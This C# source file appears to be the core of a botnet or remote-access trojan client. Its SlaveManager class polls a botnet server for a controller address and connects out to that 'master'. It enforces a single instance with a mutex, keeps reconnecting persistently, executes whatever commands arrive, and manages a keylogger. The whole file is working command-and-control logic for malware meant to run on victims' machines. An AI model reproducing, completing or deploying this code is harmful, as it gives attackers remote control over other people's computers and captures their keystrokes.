using Shared;
using Slave.Botnet;
using Slave.Commands.Core;
using System;
using System.Collections.Generic;
using System.Threading;

namespace Slave.Core
{
    public class SlaveManager
    {
        internal SlaveNetworkManager networkManager { get; set; }

        internal SlaveCommandsManager commandsManager { get; set; }
        
        /// <summary>
        /// Number of times the slave tried to connect to the master
        /// </summary>
        int _connectionRetryCount;

        int connectionRetryCount
        {
            get => _connectionRetryCount;

            // If incrementation, reset value
            set => _connectionRetryCount = value > _connectionRetryCount ? Config.maxConnectionRetryCount : value;
        }

        /// <summary>
        /// Constructor checks if another instance of the application is already running,
        /// if there is one, close itself and let the already started one live
        /// </summary>
        public SlaveManager()
        {
            if (!Config.IgnoreMutex)
            {
                // Only one instance can run
                var mutex = new Mutex(false, "ThisIsMyMutex-2JUY34DE8E23D7");
                if (!mutex.WaitOne(TimeSpan.Zero, true))
                {
                    Environment.Exit(0);
                }
            }
        }

        /// <summary>
        /// Entry point of the slave manager, call the master botnet server to acquire instructions.
        /// This process occures every {retryDelay} ms.
        /// If it acquires a remote host to connect to, call the RunSlave() method
        /// </summary>
        public void StartWithBotnet()
        {
            while (true)
            {
                var connectionSettings = BotnetManager.Process();
                if (connectionSettings != null)
                {
                    // Reset retry count
                    connectionRetryCount++;

                    while (connectionRetryCount != 0)
                    {
                        try
                        {
                            RunSlave(connectionSettings.Item1, connectionSettings.Item2);
                        }
                        catch (NetworkException)
                        {
                            // Exceptions thrown trigger the network manager cleanup
                            Cleanup();
                            connectionRetryCount--;
                            Thread.Sleep(Config.masterConnectionRetryDelay);
                        }
                        catch (ExitException)
                        {
                            Cleanup();
                            // The master asked to stop the connection, break from the connection loop
                            break;
                        }
                    }
                }

                Thread.Sleep(Config.botnetServerRequestRetryDelay);
            }
        }

        /// <summary>
        /// Entry point of the slave manager, call the RunSlave() method
        /// </summary>
        public void StartWithMasterConnection()
        {
            while (true)
            {
                try
                {
                    RunSlave(Config.ip, Config.port);
                }
                catch (NetworkException)
                {
                    // Exceptions thrown trigger the network manager cleanup
                    Cleanup();
                    Thread.Sleep(Config.masterConnectionRetryDelay);
                }
                catch (ExitException)
                {
                    // The master asked to stop the connection, just exit
                    StopSlave();
                }
            }
        }

        /// <summary>
        /// Call the SlaveNetworkManager ConnectToMaster method, if the connection is succesfull,
        /// start to listen for incoming commands from the master.
        /// </summary>
        /// <param name="remoteAdress">Remote end to connect to</param>
        /// <param name="remotePort">Remote end's port to connect to</param>
        void RunSlave(string remoteAdress, int remotePort)
        {
            if (!networkManager.ConnectToMaster(remoteAdress, remotePort))
            {
                // The connection attempt wasn't successfull
                throw new NetworkException();
            }

            // Reset retry count
            connectionRetryCount++;

            // Wait for incoming data and process it
            while (true)
            {
                var incomingData = networkManager.ReadLine();
                // A simple dot beeing received is the master's connection monitoring sending a hearthbeat message
                if (incomingData == ".")
                    continue;
                ProcessCommand(incomingData);
            }
        }

        /// <summary>
        /// Process a string that was already processed by the master sending it, so it's a valid command
        /// </summary>
        /// <param name="receivedData">Data sent by the master</param>
        void ProcessCommand(string receivedData)
        {
            var splittedCommand = commandsManager.GetSplittedCommandWithoutQuotes(receivedData);
            var commandName = splittedCommand[0];
            var arguments = new List<string>();

            if (splittedCommand.Count > 1)
            {
                arguments = splittedCommand.GetRange(1, splittedCommand.Count - 1);
            }

            var command = commandsManager.GetCommandByName(commandName);

            try
            {
                // Command executed here
                command?.Process(arguments);
            }
            catch (StopSlaveException)
            {
                StopSlave();
            }
            catch (Exception ex)
            {
                if (ex.GetType() == typeof(ExitException) || ex.GetType() == typeof(NetworkException))
                {
                    throw;
                }

                // If the exception isn't an ExitExceptionor a StopSlaveException or a NetworkException, just continue
            }
        }

        /// <summary>
        /// Close network stream and stop the keylogger listening as well
        /// </summary>
        void Cleanup()
        {
            try
            {
                commandsManager.StopKeyloggerListening();
                networkManager.Cleanup();
            }
            catch (Exception)
            {
                // ignored
            }
        }

        /// <summary>
        /// Exit the program
        /// </summary>
        void StopSlave()
        {
            Cleanup();
            Environment.Exit(0);
        }
    }
}
